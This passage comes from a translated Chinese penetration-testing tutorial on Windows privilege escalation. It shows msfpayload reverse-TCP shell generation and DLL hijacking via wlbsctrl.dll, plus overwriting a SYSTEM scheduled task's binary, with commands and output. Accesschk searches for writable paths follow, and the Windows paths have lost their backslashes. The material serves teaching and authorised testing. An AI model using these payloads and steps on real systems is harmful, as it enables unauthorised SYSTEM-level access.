             BINARY_PATH_NAME   : C:Windowssystem32svchost.exe -k netsvcs
             LOAD_ORDER_GROUP   :
             TAG                : 0
             DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
             DEPENDENCIES       : BFE
             SERVICE_START_NAME : LocalSystem
现在我们已经具备了攻击它的必需条件，我们可以生成一个恶意的DLL文件并且获得一个shell了。
    root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
            Name: Windows Command Shell, Reverse TCP Inline
          Module: payload/windows/shell_reverse_tcp
        Platform: Windows
            Arch: x86
     Needs Admin: No
      Total size: 314
            Rank: Normal
     Provided by:
       vlad902 
       sf 
     Basic options:
     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------     EXITFUNC  process          yes       Exit technique: seh, thread, process, none
     LHOST     127.0.0.1        yes       The listen address
     LPORT     9988             yes       The listen port
     Description:
       Connect back to attacker and spawn a command shell
     root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D > 
     /root/Desktop/evil.dll
     Created by msfpayload (http://www.metasploit.com).
     Payload: windows/shell_reverse_tcp
      Length: 314
     Options: {"lhost"=>"127.0.0.1", "lport"=>"9988"}
在把恶意DLL传输到目标机器后，我们需要把它重命名为“wlbsctrl.dll”并且移动到"C:Python27"目录下，然后我们需要耐心的等待机器重启（或者我们可以尝试强制让它重启），然后我们将获得一个SYSTEM权限的shell了。
    重要的再说一遍，下面的操作是用一个低权限的用户user1操作的。
     C:Usersuser1Desktop> dir
      Volume in drive C has no label.
      Volume Serial Number is 948D-A98F
      Directory of C:Usersuser1Desktop
     02/18/2014  01:49 PM              .
     02/18/2014  01:49 PM              ..
     04/22/2013  09:39 AM           331,888 accesschk.exe
     02/18/2014  12:38 PM            14,336 evil.dll
     01/25/2014  12:46 AM            36,864 fubar.exe
     01/22/2014  08:17 AM              incognito2
     06/30/2011  01:52 PM         1,667,584 ncat.exe
     11/22/2013  07:39 PM             1,225 wmic_info.bat
                    5 File(s)      2,051,897 bytes
                    3 Dir(s)      73,052,160 bytes free
     C:Usersuser1Desktop> copy evil.dll C:Python27wlbsctrl.dll
             1 file(s) copied.
     C:Usersuser1Desktop> dir C:Python27
      Volume in drive C has no label.
      Volume Serial Number is 948D-A98F
      Directory of C:Python27
     02/18/2014  01:53 PM              .
     02/18/2014  01:53 PM              ..
     10/20/2012  02:52 AM              DLLs
     10/20/2012  02:52 AM              Doc
     10/20/2012  02:52 AM              include
     01/28/2014  03:45 AM              Lib
     10/20/2012  02:52 AM              libs
     04/10/2012  11:34 PM            40,092 LICENSE.txt
     04/10/2012  11:18 PM           310,875 NEWS.txt
     04/10/2012  11:31 PM            26,624 python.exe
     04/10/2012  11:31 PM            27,136 pythonw.exe
     04/10/2012  11:18 PM            54,973 README.txt
     10/20/2012  02:52 AM              tcl
     10/20/2012  02:52 AM              Tools
     04/10/2012  11:31 PM            49,664 w9xpopen.exe
     02/18/2014  12:38 PM            14,336 wlbsctrl.dll
                    7 File(s)        523,700 bytes
                    9 Dir(s)      73,035,776 bytes free
万事俱备，只差重启。为了做演示，我使用Administrator用户手动的重启了这个被攻击的服务。
最后的例子呢，让我们看一下计划任务。重新检查我们一开始搜集的关于计划任务的信息，我将对下面的条目进行讲解。
     HostName:                             B33F
     TaskName:                             LogGrabberTFTP
     Next Run Time:                        2/19/2014 9:00:00 AM
     Status:                               Ready
     Logon Mode:                           Interactive/Background
     Last Run Time:                        N/A
     Last Result:                          1
     Author:                               B33Fb33f
     Task To Run:                          E:GrabLogstftp.exe 10.1.1.99 GET log.out E:GrabLogsLogslog.txt
     Start In:                             N/A
     Comment:                              N/A
     Scheduled Task State:                 Enabled
     Idle Time:                            Disabled
     Power Management:                     Stop On Battery Mode, No Start On Batteries
     Run As User:                          SYSTEM
     Delete Task If Not Rescheduled:       Enabled
     Stop Task If Runs X Hours and X Mins: 72:00:00
     Schedule:                             Scheduling data is not available in this format.
     Schedule Type:                        Daily
     Start Time:                           9:00:00 AM
     Start Date:                           2/17/2014
     End Date:                             N/A
     Days:                                 Every 1 day(s)
     Months:                               N/A
     Repeat: Every:                        Disabled
     Repeat: Until: Time:                  Disabled
     Repeat: Until: Duration:              Disabled
     Repeat: Stop If Still Running:        Disabled
从上面的结果可以看到，有一个TFTP客户端，它会在一个时间点和一个远程主机进行连接，并且下载某些日志文件。它会在每天的上午九点运行，并且是用SYSTEM权限运行的（我的天呐）。让我们看下我们对这个路径是否有写入权限。
    C:Usersuser1Desktop> accesschk.exe -dqv "E:GrabLogs"
     E:GrabLogs
       Medium Mandatory Level (Default) [No-Write-Up]
       RW BUILTINAdministrators
             FILE_ALL_ACCESS
       RW NT AUTHORITYSYSTEM
             FILE_ALL_ACCESS
       RW NT AUTHORITYAuthenticated Users
             FILE_ADD_FILE
             FILE_ADD_SUBDIRECTORY
             FILE_LIST_DIRECTORY
             FILE_READ_ATTRIBUTES
             FILE_READ_EA
             FILE_TRAVERSE
             FILE_WRITE_ATTRIBUTES
             FILE_WRITE_EA
             DELETE
             SYNCHRONIZE
             READ_CONTROL
       R  BUILTINUsers
             FILE_LIST_DIRECTORY
             FILE_READ_ATTRIBUTES
             FILE_READ_EA
             FILE_TRAVERSE
             SYNCHRONIZE
             READ_CONTROL
     C:Usersuser1Desktop> dir "E:GrabLogs"
      Volume in drive E is More
      Volume Serial Number is FD53-2F00
      Directory of E:GrabLogs
     02/18/2014  11:34 PM              .
     02/18/2014  11:34 PM              ..
     02/18/2014  11:34 PM              Logs
     02/18/2014  09:21 PM           180,736 tftp.exe
                    1 File(s)        180,736 bytes
                    3 Dir(s)   5,454,602,240 bytes free
可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务来说，根本不需要使用SYSTEM的权限来运行，更糟糕的是，任何经过身份验证的用户都对这个文件夹有写入的权限。从渗透测试的合约来说，到了这一步我只需要生成一个木马，做一个后门（同时要保证它会完美的运行）就可以了，但是作为本次教学的例子，我们可以简单的用木马覆盖掉“tftp.exe”：
    root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
            Name: Windows Command Shell, Reverse TCP Inline
          Module: payload/windows/shell_reverse_tcp
        Platform: Windows
            Arch: x86
     Needs Admin: No
      Total size: 314
            Rank: Normal
     Provided by:
       vlad902 
       sf 
     Basic options:
     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------     EXITFUNC  process          yes       Exit technique: seh, thread, process, none
     LHOST     127.0.0.1        yes       The listen address
     LPORT     9988             yes       The listen port
     Description:
       Connect back to attacker and spawn a command shell
     root@darkside:~# msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
     exe > /root/Desktop/evil-tftp.exe
     [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)
现在剩下的事就是上传我们的恶意文件，覆盖掉"E:GrabLogstftp.exe"，一旦做完了就早点睡觉，防止因为猝死而看不到弹回来的shell。这里要注意的是，别忘了检查一下要入侵的计算机的时间和时区。
    C:Usersuser1Desktop> dir
      Volume in drive C has no label.
      Volume Serial Number is 948D-A98F
      Directory of C:Usersuser1Desktop
     02/19/2014  01:36 AM              .
     02/19/2014  01:36 AM              ..
     04/22/2013  09:39 AM           331,888 accesschk.exe
     02/19/2014  01:31 AM            73,802 evil-tftp.exe
     01/25/2014  12:46 AM            36,864 fubar.exe
     01/22/2014  08:17 AM              incognito2
     06/30/2011  01:52 PM         1,667,584 ncat.exe
     02/18/2014  12:38 PM            14,336 wlbsctrl.dll
     11/22/2013  07:39 PM             1,225 wmic_info.bat
                    6 File(s)      2,125,699 bytes
                    3 Dir(s)      75,341,824 bytes free
     C:Usersuser1Desktop> copy evil-tftp.exe E:GrabLogstftp.exe
     Overwrite E:GrabLogstftp.exe? (Yes/No/All): Yes
             1 file(s) copied.
这两个例子给了你提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项。
通过上面的各个例子，我们可以看出accesschk称得上是杀人越货的必备工具，在文章结束之前，我想给你一些在使用accesschk上的建议。
    当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议。
     accesschk.exe /accepteula ... ... ...
     找出某个驱动器下所有权限配置有缺陷的文件夹路径
     accesschk.exe -uwdqs Users c:
     accesschk.exe -uwdqs "Authenticated Users" c:
     找出某个驱动器下所有权限配置有缺陷的文件路径
     accesschk.exe -uwqs Users c:*.*
     accesschk.exe -uwqs "Authenticated Users" c:*.*
**总结**
这份指南写的是Windows提权的一些基本套路，如果你想真正的精通Windows提权，你需要投入大量的精力去研究。对于渗透测试的各个阶段，信息搜集环节总是最关键的，你对目标机器了解的越多，你的思路就越猥琐，你成功的几率就越大。
有时候你会将你的权限提升到Administrator，从Administrator提升到SYSTEM权限是不成问题的，你依旧可以重新配置一个服务，或者创建一个用SYSTEM权限运行的计划任务。
现在，搞起来搞起来搞起来！SYSTEMSYSTEMSYSTEM！
**传送门**
* * *
**[【技术分享】Windows下的渗透测试之提权的基本套路（上）](http://bobao.360.cn/learning/detail/3158.html)**